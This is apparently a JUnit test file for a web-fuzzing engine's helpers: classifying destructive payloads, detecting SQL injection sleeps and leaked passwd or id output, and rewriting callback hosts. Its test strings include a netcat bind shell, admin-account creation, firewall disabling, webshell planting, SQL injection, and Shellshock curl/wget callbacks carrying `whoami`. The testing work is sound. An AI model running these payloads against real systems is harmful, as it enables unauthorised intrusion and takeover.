package com.victor.reconloop;

import org.junit.Test;

import java.util.List;
import java.util.Optional;
import java.util.Set;

import static org.junit.Assert.*;

public class CorpusFuzzEngineTest {

    // ---- isDestructive ----

    @Test
    public void netcatBindShellIsDestructive() {
        assertTrue(CorpusFuzzEngine.isDestructive("nc -lvvp 4444 -e /bin/sh"));
    }

    @Test
    public void windowsAccountCreationIsDestructive() {
        assertTrue(CorpusFuzzEngine.isDestructive("net user hacker Password1 /ADD"));
        assertTrue(CorpusFuzzEngine.isDestructive("net localgroup Administrators hacker /ADD"));
    }

    @Test
    public void registryEditIsDestructive() {
        assertTrue(CorpusFuzzEngine.isDestructive(
                "reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f"));
    }

    @Test
    public void firewallDisableIsDestructive() {
        assertTrue(CorpusFuzzEngine.isDestructive("netsh firewall set opmode disable"));
    }

    @Test
    public void webshellPlantingIsDestructive() {
        assertTrue(CorpusFuzzEngine.isDestructive("echo \"<?php system($_GET['cmd']); ?>\" > cmd.php"));
        assertTrue(CorpusFuzzEngine.isDestructive("echo \"use Socket;...\" > rev.pl"));
    }

    @Test
    public void ordinaryInfoDisclosurePayloadsAreNotDestructive() {
        assertFalse(CorpusFuzzEngine.isDestructive("whoami"));
        assertFalse(CorpusFuzzEngine.isDestructive("id"));
        assertFalse(CorpusFuzzEngine.isDestructive("sleep 5"));
        assertFalse(CorpusFuzzEngine.isDestructive("' OR '1'='1"));
        assertFalse(CorpusFuzzEngine.isDestructive(null));
    }

    // ---- mentionsSleep ----

    @Test
    public void recognisesTimeBasedDbFunctionsAcrossEngines() {
        assertTrue(CorpusFuzzEngine.mentionsSleep("' OR SLEEP(5)-- -"));
        assertTrue(CorpusFuzzEngine.mentionsSleep("'; SELECT PG_SLEEP(5)-- -"));
        assertTrue(CorpusFuzzEngine.mentionsSleep("'; WAITFOR DELAY '0:0:5'-- -"));
        assertTrue(CorpusFuzzEngine.mentionsSleep("1=benchmark(40000000,sha(1))"));
        assertTrue(CorpusFuzzEngine.mentionsSleep("BEGIN DBMS_LOCK.SLEEP(15); END;"));
    }

    @Test
    public void ordinaryPayloadDoesNotMentionSleep() {
        assertFalse(CorpusFuzzEngine.mentionsSleep("' OR '1'='1"));
        assertFalse(CorpusFuzzEngine.mentionsSleep(null));
    }

    // ---- containsPasswdMarker / containsIdOutput ----

    @Test
    public void detectsClassicPasswdFileContents() {
        assertTrue(CorpusFuzzEngine.containsPasswdMarker("root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1::/usr/sbin:/usr/sbin/nologin"));
    }

    @Test
    public void ordinaryBodyHasNoPasswdMarker() {
        assertFalse(CorpusFuzzEngine.containsPasswdMarker("<html>welcome</html>"));
        assertFalse(CorpusFuzzEngine.containsPasswdMarker(null));
    }

    @Test
    public void detectsIdCommandOutputShape() {
        assertTrue(CorpusFuzzEngine.containsIdOutput("uid=33(www-data) gid=33(www-data) groups=33(www-data)"));
    }

    @Test
    public void ordinaryBodyHasNoIdOutput() {
        assertFalse(CorpusFuzzEngine.containsIdOutput("<html>welcome, user 42</html>"));
        assertFalse(CorpusFuzzEngine.containsIdOutput(null));
    }

    // ---- findCallbackHost / rewriteCallbackHost ----

    @Test
    public void findsDomainCallbackHostInCurlCommand() {
        Optional<String> host = CorpusFuzzEngine.findCallbackHost("curl https://crowdshield.com/.testing/rce_vuln.txt");
        assertEquals(Optional.of("crowdshield.com"), host);
    }

    @Test
    public void findsIpCallbackHostInWgetCommand() {
        Optional<String> host = CorpusFuzzEngine.findCallbackHost("() { :;}; /bin/bash -c \"wget http://135.23.158.130/.testing/shellshock.txt?vuln=4\"");
        assertEquals(Optional.of("135.23.158.130"), host);
    }

    @Test
    public void noCallbackHostWhenPayloadHasNoCurlOrWget() {
        assertEquals(Optional.empty(), CorpusFuzzEngine.findCallbackHost("' OR '1'='1"));
        assertEquals(Optional.empty(), CorpusFuzzEngine.findCallbackHost(null));
    }

    @Test
    public void rewriteReplacesHostButPreservesRestOfPayload() {
        String original = "curl https://crowdshield.com/.testing/rce_vuln.txt";
        String rewritten = CorpusFuzzEngine.rewriteCallbackHost(original, "abc123.oastify.com");
        assertEquals("curl https://abc123.oastify.com/.testing/rce_vuln.txt", rewritten);
    }

    @Test
    public void rewritePreservesEmbeddedCommandSubstitutionAroundTheHost() {
        String original = "() { :;}; /bin/bash -c \"curl http://135.23.158.130/.testing/shellshock.txt?vuln=16?user=`whoami`\"";
        String rewritten = CorpusFuzzEngine.rewriteCallbackHost(original, "abc123.oastify.com");
        assertTrue(rewritten.contains("curl http://abc123.oastify.com/.testing/shellshock.txt?vuln=16?user=`whoami`"));
        assertFalse(rewritten.contains("135.23.158.130"));
    }

    @Test
    public void rewriteIsNoOpWhenNoCallbackHostPresent() {
        String original = "' OR '1'='1";
        assertEquals(original, CorpusFuzzEngine.rewriteCallbackHost(original, "abc123.oastify.com"));
    }

    // ---- parseRceParamHints ----

    @Test
    public void parsesParamNamesFromRceHintLines() {
        Set<String> names = CorpusFuzzEngine.parseRceParamHints(List.of(
                "?cmd={payload}", "?exec={payload}", "?command={payload}", "?ping={payload}"));
        assertTrue(names.containsAll(Set.of("cmd", "exec", "command", "ping")));
    }

    @Test
    public void emptyOrNullHintLinesProduceEmptySet() {
        assertTrue(CorpusFuzzEngine.parseRceParamHints(List.of()).isEmpty());
        assertTrue(CorpusFuzzEngine.parseRceParamHints(null).isEmpty());
    }

    // ---- relevantCategories ----

    @Test
    public void alwaysIncludesUniversalCategoriesWhenAvailable() {
        Set<String> available = Set.of("sqli", "sqli2", "xss", "ssti", "lfi", "rce_payloads");
        List<String> categories = CorpusFuzzEngine.relevantCategories("q", "search term", Set.of(), available);
        assertTrue(categories.containsAll(List.of("sqli", "sqli2", "xss", "ssti")));
        assertFalse(categories.contains("lfi"));
        assertFalse(categories.contains("rce_payloads"));
    }

    @Test
    public void includesLfiForPathLikeParameterName() {
        Set<String> available = Set.of("sqli", "sqli2", "xss", "ssti", "lfi");
        List<String> categories = CorpusFuzzEngine.relevantCategories("filename", "report.pdf", Set.of(), available);
        assertTrue(categories.contains("lfi"));
    }

    @Test
    public void includesLfiForPathLikeValueEvenWithoutHintedName() {
        Set<String> available = Set.of("sqli", "sqli2", "xss", "ssti", "lfi");
        List<String> categories = CorpusFuzzEngine.relevantCategories("x", "../../etc/passwd", Set.of(), available);
        assertTrue(categories.contains("lfi"));
    }

    @Test
    public void includesRcePayloadsOnlyForKnownCommandParamName() {
        Set<String> available = Set.of("sqli", "sqli2", "xss", "ssti", "rce_payloads");
        Set<String> hints = Set.of("cmd", "exec", "command");

        assertTrue(CorpusFuzzEngine.relevantCategories("cmd", "1", hints, available).contains("rce_payloads"));
        assertFalse(CorpusFuzzEngine.relevantCategories("q", "1", hints, available).contains("rce_payloads"));
    }

    @Test
    public void neverIncludesTheRceHintCategoryItselfAsFireable() {
        Set<String> available = Set.of("sqli", "sqli2", "xss", "ssti", "rce", "rce_payloads");
        Set<String> hints = Set.of("cmd");
        List<String> categories = CorpusFuzzEngine.relevantCategories("cmd", "1", hints, available);
        assertFalse(categories.contains("rce"));
    }

    @Test
    public void unavailableCategoriesAreNeverReturnedEvenIfHeuristicallyRelevant() {
        Set<String> available = Set.of("sqli"); // no xss/ssti/sqli2/lfi/rce_payloads in this deployment
        List<String> categories = CorpusFuzzEngine.relevantCategories("filename", "/etc/passwd", Set.of("cmd"), available);
        assertEquals(List.of("sqli"), categories);
    }
}
